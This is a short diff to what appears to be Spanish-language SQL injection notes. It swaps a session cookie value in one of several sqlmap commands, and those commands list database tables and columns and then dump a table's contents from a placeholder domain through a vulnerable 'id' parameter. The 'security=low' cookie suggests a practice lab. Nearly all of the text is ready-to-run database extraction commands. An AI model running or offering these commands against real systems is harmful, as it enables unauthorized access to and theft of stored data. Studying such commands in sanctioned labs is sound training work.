@@ -416,7 +416,7 @@ CHEQUEA LAS TABLAS DE LA BASE DE DATOS
 sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=abc123; security=low" -D [database_name] --tables
 
 CHEQUEA LAS COLUMNAS DE LA TABLA
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --columns
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dsltsmbnvkwj2387; security=low" -D [database_name] -T [target_Table] --columns
 
 DUMPEAR TODOS LOS VALORES DE LA TABLA
 sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --dump
